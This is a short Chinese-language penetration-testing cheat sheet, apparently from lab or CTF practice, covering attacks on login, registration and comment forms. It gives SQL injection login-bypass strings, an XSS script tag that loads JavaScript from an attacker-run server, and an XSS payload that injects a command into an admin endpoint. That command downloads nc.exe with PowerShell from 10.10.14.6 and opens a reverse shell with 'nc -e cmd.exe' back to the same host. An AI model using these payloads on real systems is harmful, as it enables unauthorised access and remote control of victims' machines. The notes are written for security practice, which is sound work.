# \*登陆&注册&留言（xss）

### 登陆

1. 注意页面源代码可能包含判断逻辑，注意js文件
2. 考虑sql注入，弱口令，弱逻辑，易得密码本爆破，sql绕过
3. 水平越权测试
4. 如果不管增么登陆都是200，就要考虑rce，多加一个“测试，看能不能造成信息泄漏
5. 登陆测试

```bash
admin' or '1'='1 # 
或者单引号来测试sql
```

### 注册

1. 注册限制，看是否可以绕过（bp构造）
2. 如果可以注册，那就看看能不能水平越权，常利用url（如果显示用户名的话）

```bash
Username: ' or 1='1
Password: ' or 1='1
Confirm password: ' or 1='1
```

### 留言

```bash
<script src="http://10.10.14.5/test.js"></script>
python3 -m http.server 80  --本地开服务器让那边找你这个test.js
```

xss反弹shell

```bash
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.6/nc.exe -outfile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.14.6 1234';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```

<figure><img src="https://img-blog.csdnimg.cn/1df42e615af34c73b83dcac3122cde78.png" alt=""><figcaption></figcaption></figure>
